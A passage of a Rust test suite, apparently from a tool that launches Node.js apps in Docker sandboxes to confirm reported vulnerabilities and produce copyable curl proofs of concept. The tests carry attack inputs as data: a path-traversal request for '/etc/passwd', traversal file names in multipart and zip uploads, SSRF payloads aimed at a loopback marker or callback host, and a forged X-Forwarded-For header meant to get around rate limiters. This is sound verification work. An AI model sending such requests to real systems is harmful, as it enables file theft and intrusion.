               if (!req.query.url) return res.status(400).json({ error: 'missing' });\n\
               return res.status(200).json({ echoed: req.query.url });\n\
             }\n",
        );
        let port = available_local_port().unwrap();
        let mut server = Command::new("node")
            .arg("jss-worker-host.mjs")
            .arg("api/proxy.js")
            .current_dir(root)
            .env("PORT", port.to_string())
            .stderr(std::process::Stdio::null())
            .spawn()
            .unwrap();
        let spec = format!(
            "{{\"method\":\"GET\",\"path\":\"/api/proxy?url=http%3A%2F%2Fexample.test%2Fx\",\"port\":{port},\"headers\":{{}}}}"
        );
        let mut body = String::new();
        for _ in 0..100 {
            std::thread::sleep(std::time::Duration::from_millis(100));
            let Ok(output) = Command::new("node")
                .arg("jss-driver.js")
                .arg(&spec)
                .current_dir(root)
                .output()
            else {
                continue;
            };
            body = String::from_utf8_lossy(&output.stdout).into_owned();
            if body.contains("echoed") || body.contains("missing") {
                break;
            }
        }
        let _ = server.kill();
        let _ = server.wait();
        assert!(
            body.contains("\"echoed\":\"http://example.test/x\""),
            "the Node (req, res) function's query-driven JSON response was not served: {body:?}"
        );
    }

    #[test]
    fn generated_configuration_retry_requires_an_explicit_generation_message() {
        assert!(generated_startup_config(
            "Config file not found, generating defaults.\nSPX exit!"
        ));
        assert!(generated_startup_config(
            "Configuration file not found; creating default configuration"
        ));
        assert!(!generated_startup_config("Config file not found"));
        assert!(!generated_startup_config(
            "Generating defaults for the response payload"
        ));
    }

    /// A startup failure where the app writes a file before creating its directory yields the
    /// directory to mount as scratch; a failed read, or any non-write failure, yields nothing.
    #[test]
    fn missing_write_dir_only_fires_for_a_failed_startup_write() {
        let write_log = "node:fs:2430\n    return binding.writeFileUtf8(\n\
            Error: ENOENT: no such file or directory, open '/root/.app/.env'\n\
            \x20   at Object.writeFileSync (node:fs:2430:20)\n\
            \x20   at Object.appendFileSync (node:fs:2512:6)\n\
            \x20 code: 'ENOENT', syscall: 'open', path: '/root/.app/.env'\n";
        assert_eq!(missing_write_dir(write_log).as_deref(), Some("/root/.app"));

        let mkdir_log = "Error: ENOENT: no such file or directory, mkdir '/var/data/cache'\n\
            \x20   at Object.mkdirSync (node:fs:1372:26)\n";
        assert_eq!(missing_write_dir(mkdir_log).as_deref(), Some("/var/data"));

        // A failed read must not conjure a directory that could hide a required file.
        let read_log = "Error: ENOENT: no such file or directory, open '/app/config/settings.json'\n\
            \x20   at Object.readFileSync (node:fs:2345:20)\n";
        assert_eq!(missing_write_dir(read_log), None);

        // A missing module, or the filesystem root, is not a scratch directory.
        assert_eq!(
            missing_write_dir("Error: Cannot find module 'express'"),
            None
        );
        let root_log = "Error: ENOENT: no such file or directory, open '/.env'\n\
            \x20   at Object.writeFileSync (node:fs:2430:20)\n";
        assert_eq!(missing_write_dir(root_log), None);
    }

    /// A startup failure where an `https`/`tls` server reads a key/cert file that is absent yields the
    /// path to stage from the self-signed marker pair, with the key/cert role inferred from the name;
    /// a write, or a read of a non-TLS file, yields nothing.
    #[test]
    fn missing_tls_material_fires_only_for_a_failed_tls_read() {
        let key_log = "node:fs:560\n    return binding.open(\n\
            Error: ENOENT: no such file or directory, open '/app/0.0.0.0-key.pem'\n\
            \x20   at Object.readFileSync (node:fs:444:35)\n\
            \x20 code: 'ENOENT', syscall: 'open', path: '/app/0.0.0.0-key.pem'\n";
        assert_eq!(
            missing_tls_material(key_log),
            Some(("/app/0.0.0.0-key.pem".to_owned(), true))
        );

        let cert_log = "Error: ENOENT: no such file or directory, open '/app/0.0.0.0.pem'\n\
            \x20   at Object.readFileSync (node:fs:444:35)\n";
        assert_eq!(
            missing_tls_material(cert_log),
            Some(("/app/0.0.0.0.pem".to_owned(), false))
        );

        let crt_log = "Error: ENOENT: no such file or directory, open '/etc/ssl/server.crt'\n\
            \x20   at Object.readFileSync (node:fs:444:35)\n";
        assert_eq!(
            missing_tls_material(crt_log),
            Some(("/etc/ssl/server.crt".to_owned(), false))
        );

        // A write of a `.pem`, or a read of a non-TLS file, must not be treated as TLS material.
        let write_log = "Error: ENOENT: no such file or directory, open '/app/out.pem'\n\
            \x20   at Object.writeFileSync (node:fs:2430:20)\n";
        assert_eq!(missing_tls_material(write_log), None);
        let json_log = "Error: ENOENT: no such file or directory, open '/app/config.json'\n\
            \x20   at Object.readFileSync (node:fs:444:35)\n";
        assert_eq!(missing_tls_material(json_log), None);
    }

    #[test]
    fn missing_dotenv_file_requires_an_explicit_dotenv_startup_failure() {
        let log = "[dotenv] injected env (0) from .env\n\
            Error: Failed to load .env file: ENOENT: no such file or directory, open '/app/.env'\n";
        assert_eq!(missing_dotenv_file(log), Some("/app/.env".to_owned()));

        let ordinary_missing =
            "Error: ENOENT: no such file or directory, open '/app/config.json'\n";
        assert_eq!(missing_dotenv_file(ordinary_missing), None);
        let unrelated_env =
            "Error: ENOENT: no such file or directory, open '/app/runtime.env'\n dotenv\n";
        assert_eq!(missing_dotenv_file(unrelated_env), None);
    }

    /// Only external-service credential names are set to a filler, and only from the sink's import
    /// graph; the sandbox's own variables and non-credential names (including `PATH`) are left alone.
    #[test]
    fn credential_env_sets_only_credential_named_variables() {
        assert!(credential_name("GITHUB_TOKEN"));
        assert!(credential_name("GH_TOKEN"));
        assert!(credential_name("GITHUB_PAT"));
        assert!(credential_name("SESSION_SECRET"));
        assert!(credential_name("DB_PASSWORD"));
        // An external-service API key gates an integration's forward branch exactly like a token.
        assert!(credential_name("GEMINI_API_KEY"));
        assert!(credential_name("OPENAI_API_KEY"));
        assert!(credential_name("STRIPE_SECRET_KEY"));
        assert!(credential_name("SENDGRID_APIKEY"));
        assert!(!credential_name("VAPID_PUBLIC_KEY"));
        assert!(!credential_name("VAPID_PRIVATE_KEY"));
        assert!(!credential_name("PATH"));
        assert!(!credential_name("DATABASE_URL"));
        assert!(!credential_name("NODE_OPTIONS"));
        assert!(!credential_name("NPM_CONFIG_CACHE"));

        let sources = [
            "export function auth(){ return process.env.TBC_GITHUB_TOKEN || process.env.GITHUB_PAT; }"
                .to_owned(),
            "const p = process.env.PATH; const port = process.env.PORT;".to_owned(),
        ];
        let env = credential_env(&sources);
        let names: Vec<&str> = env.iter().map(|e| e.name.as_str()).collect();
        assert_eq!(names, ["TBC_GITHUB_TOKEN", "GITHUB_PAT"]);
        assert!(
            env.iter()
                .all(|e| e.value == STRONG_FILLER_SECRET && !e.directory)
        );
    }

    /// The variables a startup failure demands, read from the app's own error; each with a value
    /// of the kind its name asks for. Source echoes, error codes, Node's own and the sandbox's
    /// variables are not taken.
    #[test]
    fn required_env_reads_a_startup_failure() {
        let log = "file:///app/x/workspace-root.js:42\n\
            \x20 if (!value) throw new Error(`${WORKSPACE_ROOT_ENV} is required`);\n\
            Error: NOOBOT_WORKSPACE_ROOT is required\n\
            Missing required environment variable: DATABASE_URL\n\
            Missing env var(s): REDIS_URL\n\
            Error: missing env vars: AUTH0_SECRET, AUTH0_CLIENT_ID, AUTH0_CLIENT_SECRET\n\
            AIRQO_ENV environment variable not set\n\
            \"SESSION_SECRET\" must be set\n\
            Error [ERR_MODULE_NOT_FOUND]: Cannot find package 'x' is missing\n\
            NODE_OPTIONS is not set\n\
            PORT is required\n\
            Error: NOOBOT_WORKSPACE_ROOT is required\n\
            LOG_LEVEL defaults to info\n";
        let env = required_env(log);
        let names: Vec<&str> = env.iter().map(|e| e.name.as_str()).collect();
        assert_eq!(
            names,
            [
                "NOOBOT_WORKSPACE_ROOT",
                "DATABASE_URL",
                "REDIS_URL",
                "AUTH0_SECRET",
                "AUTH0_CLIENT_ID",
                "AUTH0_CLIENT_SECRET",
                "AIRQO_ENV",
                "SESSION_SECRET"
            ]
        );
        assert_eq!(
            env[0],
            RequiredEnv {
                name: "NOOBOT_WORKSPACE_ROOT".to_owned(),
                value: "/jss-env/noobot_workspace_root".to_owned(),
                directory: true,
            }
        );
        assert_eq!(env[1].value, "http://jss-filler.test/");
        assert!(!env[1].directory);
        assert_eq!(env[2].value, "http://jss-filler.test/");
        assert_eq!(env[3].value, STRONG_FILLER_SECRET);
        assert_eq!(env[4].value, "jsspector");
        assert_eq!(env[5].value, STRONG_FILLER_SECRET);
        assert_eq!(env[6].value, "jsspector");
        assert_eq!(env[7].value, STRONG_FILLER_SECRET);
        assert!(STRONG_FILLER_SECRET.len() >= 64);
        assert!(required_env("the app did not listen within 90s").is_empty());
    }

    #[test]
    fn startup_stack_config_fills_only_typed_variables_from_the_crashing_app_file() {
        let dir = tempfile::tempdir().unwrap();
        write(
            dir.path(),
            "config/razorpay.js",
            "new Razorpay({key_id:process.env.RAZORPAY_KEY,\
             key_secret:process.env.RAZORPAY_SECRET});\
             configurePush(process.env.VAPID_PUBLIC_KEY,process.env.VAPID_PRIVATE_KEY);\
             if(process.env.ENABLE_PAYMENTS) start();",
        );
        let env = config_env(
            "Error: `key_id` is mandatory\n    at /app/config/razorpay.js:1:1",
            dir.path(),
        );
        let names: Vec<&str> = env.iter().map(|item| item.name.as_str()).collect();
        assert_eq!(names, ["RAZORPAY_KEY", "RAZORPAY_SECRET"]);
        assert!(env.iter().all(|item| item.value == STRONG_FILLER_SECRET));

        let local_log = format!(
            "Error: `key_id` is mandatory\n    at {}/config/razorpay.js:1:1",
            dir.path().display()
        );
        let local_names: Vec<String> = config_env(&local_log, dir.path())
            .into_iter()
            .map(|item| item.name)
            .collect();
        assert_eq!(local_names, ["RAZORPAY_KEY", "RAZORPAY_SECRET"]);
    }

    #[test]
    fn startup_stack_fills_a_literal_environment_backed_setting() {
        let dir = tempfile::tempdir().unwrap();
        write(
            dir.path(),
            "helper/passport.js",
            "const secret = await getSetting('auth', 'token', 'secret_key');\n",
        );
        let log = format!(
            "TypeError: JwtStrategy requires a secret or key\n    at {}/helper/passport.js:1:1",
            dir.path().display()
        );
        let env = config_env(&log, dir.path());
        assert_eq!(env.len(), 1);
        assert_eq!(env[0].name, "global_auth_token_secret_key");
        assert_eq!(
            serde_json::from_str::<String>(&env[0].value).unwrap(),
            STRONG_FILLER_SECRET
        );
        assert!(!env[0].directory);
    }

    #[test]
    fn config_source_env_fills_a_typed_path_variable_the_handler_needs_without_diverting_the_branch()
     {
        // The handler builds a path from a deployment variable before the sink
        // (`path.join(process.env.PROJECT_PATH, ...)`); unset, `path.join(undefined, ...)` throws and
        // the request dies before the sink. The `_PATH` name gets a fresh directory, while the mode
        // toggle (`INLINE_API`, no inferable kind) and the fallback name (`PROJECT_NAME`) are left
        // unset so the vulnerable branch the finding reported still runs.
        let source = "const base = path.join(process.env.PROJECT_PATH, 'dist', \
             process.env.PROJECT_NAME || '', 'functions');\n\
             const mobile = process.env.NODEJS_MOBILE_DATA_DIR;\n\
             if (!process.env.INLINE_API) { require('child_process').exec(cmd); }\n";
        let env = config_source_env(&[source.to_owned()]);
        let names: Vec<&str> = env.iter().map(|item| item.name.as_str()).collect();
        assert_eq!(names, ["PROJECT_PATH"]);
        assert!(env[0].directory);
        assert!(env[0].value.starts_with('/'));
    }

    #[test]
    fn guarded_optional_modules_are_collected_from_imported_runtime_sources() {
        let dir = tempfile::tempdir().unwrap();
        write(
            dir.path(),
            "route.js",
            "try { require('entry-optional'); } catch (_) {}",
        );
        let imported = "let channel; try { ({ channel } = require('bridge')); } catch (_) {}";
        assert_eq!(
            guarded_modules(
                dir.path(),
                Some(std::path::Path::new("route.js")),
                &[imported.to_owned()],
            ),
            ["bridge", "entry-optional"]
        );
    }

    #[test]
    fn the_esm_missing_module_hook_is_valid_and_only_handles_missing_bare_packages() {
        assert!(LAUNCH_ESM_HOOK_JS.contains("error.code !== 'ERR_MODULE_NOT_FOUND'"));
        assert!(LAUNCH_ESM_HOOK_JS.contains("!isBare(specifier)"));
        if Command::new("node").arg("--version").output().is_err() {
            return;
        }
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "hook.mjs", LAUNCH_ESM_HOOK_JS);
        let output = Command::new("node")
            .args(["--check", "hook.mjs"])
            .current_dir(dir.path())
            .output()
            .unwrap();
        assert!(
            output.status.success(),
            "{}",
            String::from_utf8_lossy(&output.stderr)
        );
    }

    /// The copyable command for an absolute-form request target sends it as is, to the app.
    #[test]
    fn an_absolute_form_target_reproduces_with_request_target() {
        let token = "t-1".to_owned();
        let attempt = Attempt {
            verb: "GET",
            target: format!("http://jss-marker/{token}"),
            body: None,
            headers: Vec::new(),
            signal: Signal::ServiceReached(token),
        };
        let command = curl_command(&attempt, 8000);
        assert!(
            command.contains("--url 'http://TARGET_HOST:8000'"),
            "{command}"
        );
        assert!(
            command.contains("--request-target 'http://CALLBACK_HOST'"),
            "{command}"
        );
        let path = Attempt {
            target: "/x?u=1".to_owned(),
            signal: Signal::InResponse,
            ..attempt
        };
        let command = curl_command(&path, 8000);
        assert!(command.contains("--path-as-is"));
        assert!(command.contains("--url 'http://TARGET_HOST:8000/x?u=1'"));
        assert!(!command.contains("--request-target"));
    }

    #[test]
    fn a_local_marker_port_never_leaks_into_the_copyable_poc() {
        let token = "run-1".to_owned();
        let attempt = Attempt {
            verb: "POST",
            target: "/fetch".to_owned(),
            body: Some(format!("{{\"url\":\"http://0x7f000001:43210/{token}\"}}")),
            headers: vec![("Content-Type".to_owned(), "application/json".to_owned())],
            signal: Signal::ServiceReached(token),
        };
        let command = curl_command(&attempt, 8000);
        assert!(command.contains("http://CALLBACK_HOST"), "{command}");
        assert!(!command.contains("0x7f000001"), "{command}");
        assert!(!command.contains("43210"), "{command}");
    }

    #[test]
    fn a_traversal_poc_preserves_dot_segments() {
        let attempt = Attempt {
            verb: "GET",
            target: "/../../etc/passwd".to_owned(),
            body: None,
            headers: Vec::new(),
            signal: Signal::InResponse,
        };
        let command = curl_command(&attempt, 8000);
        assert!(command.contains("--path-as-is"));
        assert!(command.contains("--url 'http://TARGET_HOST:8000/../../etc/passwd'"));
    }

    #[test]
    fn a_multipart_poc_uses_readable_form_arguments_with_a_real_file() {
        let body = "--jsspector-form-boundary\r\n\
                    Content-Disposition: form-data; name=\"destination\"\r\n\r\n\
                    ../../outside\r\n\
                    --jsspector-form-boundary\r\n\
                    Content-Disposition: form-data; name=\"document\"; filename=\"jsspector-upload.bin\"\r\n\
                    Content-Type: application/octet-stream\r\n\r\n\
                    jsspector-upload\r\n\
                    --jsspector-form-boundary--\r\n";
        let attempt = Attempt {
            verb: "POST",
            target: "/upload".to_owned(),
            body: Some(body.to_owned()),
            headers: vec![(
                "Content-Type".to_owned(),
                "multipart/form-data; boundary=jsspector-form-boundary".to_owned(),
            )],
            signal: Signal::InResponse,
        };
        let command = curl_command(&attempt, 8000);
        assert!(
            command.starts_with("printf %s 'jsspector-upload' > /tmp/jsspector-upload.bin\ncurl")
        );
        assert!(command.contains("--form 'destination=../../outside'"));
        assert!(command.contains(
            "--form 'document=@/tmp/jsspector-upload.bin;filename=jsspector-upload.bin;type=application/octet-stream'"
        ));
        assert!(!command.contains("--data-raw"), "{command}");
        assert!(
            !command.contains("boundary=jsspector-form-boundary"),
            "{command}"
        );
    }

    #[test]
    fn docker_args_label_resource_creation_only() {
        let label = "monitor_42-a";
        let expected_label = format!("{VERIFY_RUN_LABEL_KEY}={label}");
        assert_eq!(
            docker_args_with_label(&["run", "-d", "--name", "app", "image"], Some(label)),
            [
                "run",
                "--label",
                &expected_label,
                "-d",
                "--name",
                "app",
                "image"
            ]
        );
        assert_eq!(
            docker_args_with_label(&["network", "create", "--internal", "net"], Some(label)),
            [
                "network",
                "create",
                "--label",
                &expected_label,
                "--internal",
                "net"
            ]
        );
        assert_eq!(
            docker_args_with_label(&["build", "-t", "image", "-f", "-", "."], Some(label)),
            [
                "build",
                "--label",
                &expected_label,
                "-t",
                "image",
                "-f",
                "-",
                "."
            ]
        );
    }

    #[test]
    fn docker_args_without_label_preserves_every_argument() {
        for args in [
            vec!["run", "-d", "image", "argument with spaces"],
            vec!["network", "create", "--internal", "net"],
            vec!["build", "-t", "image", "-f", "-", "."],
        ] {
            assert_eq!(docker_args_with_label(&args, None), args);
        }
    }

    #[test]
    fn docker_args_reject_invalid_labels_and_accept_the_length_limit() {
        let oversized = "a".repeat(65);
        for label in ["", " ", "a=b", "a/b", "a.b", "a\nb", "café", &oversized] {
            assert_eq!(
                docker_args_with_label(&["run", "image"], Some(label)),
                ["run", "image"]
            );
        }
        let longest = "a".repeat(64);
        let expected = format!("{VERIFY_RUN_LABEL_KEY}={longest}");
        assert_eq!(
            docker_args_with_label(&["run", "image"], Some(&longest)),
            ["run", "--label", &expected, "image"]
        );
    }

    #[test]
    fn docker_args_leave_existing_resource_operations_unaffected() {
        for args in [
            vec!["exec", "app", "node", "driver.js"],
            vec!["info", "--format", "{{.ServerVersion}}"],
            vec!["rm", "-f", "app"],
            vec!["rmi", "-f", "image"],
            vec!["network", "rm", "net"],
            vec!["logs", "--tail", "50", "app"],
            vec!["inspect", "-f", "{{.State.Running}}", "app"],
            vec![],
        ] {
            assert_eq!(docker_args_with_label(&args, Some("run_42")), args);
        }
    }

    #[test]
    fn request_spec_is_valid_json_for_a_body() {
        let attempt = Attempt {
            verb: "POST",
            target: "/fetch".to_owned(),
            body: Some("{\"url\":\"http://jss-marker/t\"}".to_owned()),
            headers: vec![("Content-Type".to_owned(), "application/json".to_owned())],
            signal: Signal::ServiceReached("t".to_owned()),
        };
        let spec = request_spec(&attempt, 3000, true, false);
        // Round-trips as JSON (the driver does the same parse).
        let value: serde_json::Value = serde_json::from_str(&spec).unwrap();
        assert_eq!(value["method"], "POST");
        assert_eq!(value["port"], 3000);
        assert_eq!(value["headers"]["Content-Type"], "application/json");
        assert_eq!(value["body"], "{\"url\":\"http://jss-marker/t\"}");
        assert_eq!(value["tls"], false);
        assert!(request_spec(&attempt, 3000, true, true).contains("\"tls\":true"));
        // The forwarding header de-buckets a rate limiter by default, but is suppressed on the
        // loopback-origin retry so a genuine loopback request carries no forged proxy hop.
        assert!(value["headers"].get("X-Forwarded-For").is_some());
        let loopback = request_spec(&attempt, 3000, false, false);
        let loopback_value: serde_json::Value = serde_json::from_str(&loopback).unwrap();
        assert!(loopback_value["headers"].get("X-Forwarded-For").is_none());
    }

    #[test]
    fn archive_payload_is_a_valid_stored_zip_and_binary_request() {
        assert_eq!(crc32(b"123456789"), 0xcbf4_3926);
        let archive = stored_zip("../../outside/canary", b"marker");
        assert_eq!(&archive[..4], b"PK\x03\x04");
        assert!(archive.windows(4).any(|window| window == b"PK\x01\x02"));
        assert_eq!(
            &archive[archive.len() - 22..archive.len() - 18],
            b"PK\x05\x06"
        );

        let body = multipart_file(
            "boundary",
            "file",
            "payload.zip",
            "application/zip",
            &archive,
        );
        let spec = binary_request_spec(
            3000,
            "POST",
            "/upload",
            &[(
                "Content-Type".to_owned(),
                "multipart/form-data; boundary=boundary".to_owned(),
            )],
            &body,
            false,
        );
        let value: serde_json::Value = serde_json::from_str(&spec).unwrap();
        assert_eq!(value["method"], "POST");
        assert_eq!(value["path"], "/upload");
        assert_eq!(value["bodyBase64"], base64(&body));
        assert!(value["body"].is_null());
    }

    #[test]
    fn marker_hit_preserves_target_request_metadata_for_the_public_relay() {
        let logs = concat!(
            "ordinary output\n",
            "MARKER {\"method\":\"NOTIFY\",\"path\":\"/other\",",
            "\"userAgent\":null}\n",
            "MARKER {\"method\":\"GET\",\"path\":\"/run-token-2\",",
            "\"userAgent\":\"mStream/6.0 (https://mstream.io)\"}\n",
        );
        let hit = marker_hit(logs, "run-token-2").unwrap();
        assert_eq!(
            hit,
            MarkerHit {
                method: "GET".to_owned(),
                path: "/run-token-2".to_owned(),
                user_agent: Some("mStream/6.0 (https://mstream.io)".to_owned()),
            }
        );
        let args = callback_relay_args("https://token.callback.satori.ci/run-token-2", &hit);
        assert!(
            args.windows(2)
                .any(|pair| { pair == ["--header", "X-Satori-Callback-Relay: isolated-target"] })
        );
        assert!(
            args.windows(2)
                .any(|pair| { pair == ["--header", "X-Satori-Original-Method: GET"] })
        );
        assert!(
            args.windows(2)
                .any(|pair| { pair == ["--user-agent", "mStream/6.0 (https://mstream.io)"] })
        );
    }

    #[test]
    fn marker_hit_ignores_unstructured_and_wrong_token_lines() {
        let logs = "MARKER /run-token-2\n\
                    MARKER {\"method\":\"GET\",\"path\":\"/other\",\"userAgent\":null}\n";
        assert!(marker_hit(logs, "run-token-2").is_none());
        assert_eq!(safe_method("GET"), Some("GET"));
        assert_eq!(safe_method("GET\r\nInjected"), None);
        assert_eq!(safe_user_agent(Some("bad\r\nheader")), None);
    }

    #[test]
    fn public_callback_evidence_requires_an_exact_token_path() {
        let body = br#"{"interactions":[
            {"protocol":"dns","path":null},
            {"protocol":"http","path":"/wrong-token"},
            {"protocol":"http","path":"/prefix/run-token-2"}
        ]}"#;
        assert!(callback_response_contains(body, "run-token-2"));
        assert!(!callback_response_contains(body, "run-token"));
        assert!(!callback_response_contains(b"not json", "run-token-2"));
    }

    #[test]
    fn public_callback_polling_is_limited_to_attempts_that_name_its_host() {
        let attempt = Attempt {
            verb: "POST",
            target: "/fetch".to_owned(),
            body: Some("{\"url\":\"https://abc.callback.satori.ci/probe\"}".to_owned()),
            headers: Vec::new(),
            signal: Signal::ServiceReached("probe".to_owned()),
        };
        assert!(attempt_mentions_host(&attempt, "abc.callback.satori.ci"));
        assert!(!attempt_mentions_host(&attempt, "other.callback.satori.ci"));
        let normalized = normalized_callback_attempt(&attempt, Some("abc.callback.satori.ci"));
        assert_eq!(
            normalized.body.as_deref(),
            Some("{\"url\":\"https://CALLBACK_HOST/probe\"}")
        );
        assert!(!format!("{normalized:?}").contains("abc.callback.satori.ci"));
    }

    #[test]
    fn marker_certificate_validates_private_and_callback_hostnames_only() {
        let dir = tempfile::tempdir().unwrap();
        let cert = dir.path().join("marker.crt");
        let key = dir.path().join("marker.key");
        std::fs::write(&cert, MARKER_CERT).unwrap();
        std::fs::write(&key, MARKER_KEY).unwrap();
        let cert_public = std::process::Command::new("openssl")
            .args(["x509", "-in"])
            .arg(&cert)
            .args(["-noout", "-pubkey"])
            .output()
            .expect("OpenSSL is required to validate the marker certificate");
        let key_public = std::process::Command::new("openssl")
            .args(["pkey", "-in"])
            .arg(&key)
            .args(["-pubout"])
            .output()
            .expect("OpenSSL is required to validate the marker key");
        assert!(cert_public.status.success());
        assert!(key_public.status.success());
        assert_eq!(cert_public.stdout, key_public.stdout);

        let validates = |hostname: &str| {
            std::process::Command::new("openssl")
                .args(["x509", "-in"])
                .arg(&cert)
                .args(["-noout", "-checkhost", hostname])
                .output()
                .expect("OpenSSL is required to validate the marker certificate")
                .status
                .success()
        };

        assert!(validates("jss-marker"));
        assert!(validates(
            "0123456789abcdef0123456789abcdef.callback.satori.ci"
        ));
        assert!(!validates("callback.satori.ci"));
        assert!(!validates(
            "nested.0123456789abcdef0123456789abcdef.callback.satori.ci"
        ));
    }

    #[test]
    fn a_module_worker_installs_in_its_own_package_not_the_repo_root() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        // A monorepo whose worker package declares its runtime dependency (`hono`) but no `start`
        // script: its `fetch` default export is served through the worker-host shim. `app_dir` must
        // select the worker package so `npm install` installs `hono` where the shim loads it, not the
        // repo root where it is never declared.
        write(root, "package.json", r#"{"private":true}"#);
        write(
            root,
            "workers/newsletter/package.json",
            r#"{"private":true,"dependencies":{"hono":"^4"}}"#,
        );
        write(
            root,
            "workers/newsletter/src/index.ts",
            "import { Hono } from 'hono';\nconst app = new Hono();\n\
             export default { async fetch(request, env, ctx) { return app.fetch(request, env, ctx); } };\n",
        );
        assert_eq!(
            app_dir(
                root,
                std::path::Path::new("workers/newsletter/src/index.ts")
            ),
            std::path::Path::new("workers/newsletter"),
        );
    }

    #[test]
    fn mongo_sidecar_is_selected_from_declared_dependencies() {
        let dir = tempfile::tempdir().unwrap();
        write(
            dir.path(),
            "package.json",
            r#"{"dependencies":{"mongoose":"8"}}"#,
        );
        assert!(db_service(dir.path()));
        write(
            dir.path(),
            "package.json",
            r#"{"dependencies":{"express":"5"}}"#,
        );
        assert!(!db_service(dir.path()));
        let env = db_connection_env();
        assert!(env.iter().any(|(name, value)| {
            name == "MONGODB_URI" && value == "mongodb://mongo:27017/jssverifydb"
        }));
        assert!(local_db_connection_env().iter().any(|(name, value)| {
            name == "MONGODB_URI" && value == "mongodb://127.0.0.1:27017/jssverifydb"
        }));
    }

    #[test]
    fn redis_sidecar_is_selected_from_declared_dependencies() {
        let dir = tempfile::tempdir().unwrap();
        write(
            dir.path(),
            "package.json",
            r#"{"dependencies":{"ioredis":"5"}}"#,
        );
        assert!(redis_service(dir.path()));
        write(
            dir.path(),
            "package.json",
            r#"{"dependencies":{"express":"5"}}"#,
        );
        assert!(!redis_service(dir.path()));
        let env = redis_connection_env();
        assert!(
            env.iter()
                .any(|(name, value)| name == "REDIS_URL" && value == "redis://redis:6379")
        );
        assert!(
            local_redis_connection_env()
                .iter()
                .any(|(name, value)| { name == "REDIS_URL" && value == "redis://127.0.0.1:6379" })
        );
    }

    fn write(root: &std::path::Path, rel: &str, text: &str) {
        let path = root.join(rel);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, text).unwrap();
    }

    #[test]
    fn an_azure_functions_v4_app_is_launched_through_the_azure_host_shim() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        // An Azure Functions v4 app: `func start` is the only launch, and the module registers HTTP
        // triggers on `app` from `@azure/functions` but binds no listener of its own.
        write(
            root,
            "package.json",
            r#"{"scripts":{"build":"webpack","start":"func start"},"main":"dist/server/index.js"}"#,
        );
        write(
            root,
            "src/index.tsx",
            "import { app } from '@azure/functions';\nimport fs from 'fs';\nimport path from 'path';\n\
             app.http('getChunks', { route: 'chunks/{*filePath}', methods: ['GET'], handler: (request) => {\n\
             const { filePath } = request.params;\n\
             return { body: fs.readFileSync(path.join(__dirname, '../client', filePath)) };\n} });\n",
        );
        assert_eq!(
            start_command(root, Some(std::path::Path::new("src/index.tsx"))).as_deref(),
            Some(r#"["node","/jss-azure-func-host.cjs","src/index.tsx"]"#),
            "the Azure Functions host launch is replaced by the Azure host shim",
        );
        assert!(manifest_launch_is_azure_functions(root));
        assert!(is_azure_functions_v4_module(&root.join("src/index.tsx")));
        // A plain Express server that happens to call `.listen(` (and never imports the SDK) is not an
        // Azure module and keeps the normal launch path.
        write(
            root,
            "server.js",
            "const app = require('express')(); app.get('/x', (q, r) => r.end()); app.listen(3000);",
        );
        assert!(!is_azure_functions_v4_module(&root.join("server.js")));
    }

    #[test]
    fn a_module_worker_is_launched_through_the_worker_host_shim() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        // A Cloudflare module worker: the default export's `fetch` handler serves the origin, the
        // manifest launch is `wrangler dev` (the Workers runtime, absent from the image), and the
        // module binds no listener of its own.
        write(
            root,
            "package.json",
            r#"{"type":"module","scripts":{"start":"wrangler dev","deploy":"wrangler deploy"}}"#,
        );
        write(
            root,
            "worker.js",
            "export default {\n  async fetch(request) {\n    const url = new URL(request.url);\n\
             return fetch(new URL(url.pathname, 'https://example.com/'));\n  }\n};\n",
        );
        assert!(is_module_worker(&root.join("worker.js")));
        assert_eq!(
            start_command(root, Some(std::path::Path::new("worker.js"))).as_deref(),
            Some(r#"["node","/jss-worker-host.mjs","worker.js"]"#),
            "the worker's fetch handler is served through the worker host shim",
        );
        // A self-contained server that binds its own listener keeps the normal launch path, even with
        // a default export, and a plain data object with a `fetch` field is not a worker.
        write(
            root,
            "server.js",
            "export default {}; require('http').createServer((q, r) => r.end()).listen(3000);",
        );
        assert!(!is_module_worker(&root.join("server.js")));
        write(
            root,
            "config.js",
            "export default { fetch: 'https://x/data' };\n",
        );
        assert!(!is_module_worker(&root.join("config.js")));
        // A route-handler descriptor object whose handler body merely *calls* `fetch(url)` is not a
        // worker: `fetch` there is an outbound call, not a `fetch` member of the default export.
        write(
            root,
            "handler.js",
            "export default { fn: async (req, res) => { return await fetch(req.query.url); } };\n",
        );
        assert!(!is_module_worker(&root.join("handler.js")));
    }

    #[test]
    fn a_vercel_filesystem_function_is_launched_through_the_worker_host_shim() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        // A Vite front-end project whose only launch serves the client bundle; the backend route lives
        // in a Vercel edge function under `api/` with a single-argument web handler and no listener.
        write(
            root,
            "package.json",
            r#"{"type":"module","scripts":{"dev":"vite","build":"vite build"}}"#,
        );
        write(
            root,
            "api/proxy.js",
            "export const config = { runtime: 'edge' };\n\
             export default async function handler(req) {\n\
               const target = new URL(req.url).searchParams.get('url');\n\
               return new Response(await (await fetch(target)).blob());\n\
             }\n",
        );
        assert!(is_vercel_function(root, "api/proxy.js"));
        assert_eq!(
            start_command(root, Some(std::path::Path::new("api/proxy.js"))).as_deref(),
            Some(r#"["node","/jss-worker-host.mjs","api/proxy.js"]"#),
            "the edge function's default-export handler is served through the worker host shim",
        );
        // A self-contained server under `api/` that binds its own listener keeps the normal launch path.
        write(
            root,
            "api/server.js",
            "export default {}; require('http').createServer((q, r) => r.end()).listen(3000);",
        );
        assert!(!is_vercel_function(root, "api/server.js"));
        // A module outside an `api/` deployment root is not a filesystem function.
        write(
            root,
            "src/client.js",
            "export default async function client(req) { return fetch(req); }\n",
        );
        assert!(!is_vercel_function(root, "src/client.js"));
    }

    #[test]
    fn the_package_manager_follows_the_lockfile() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        write(root, "package.json", "{}");
        assert!(package_manager(root) == PackageManager::Npm);
        write(root, "pnpm-lock.yaml", "");
        assert!(package_manager(root) == PackageManager::Pnpm);
        write(root, "yarn.lock", "");
        // A yarn lockfile wins: the repo is a yarn project and npm cannot install it.
        assert!(package_manager(root) == PackageManager::Yarn);
    }

    #[test]
    fn a_successful_but_incomplete_lockfile_install_exposes_missing_runtime_dependencies() {
        let dir = tempfile::tempdir().unwrap();
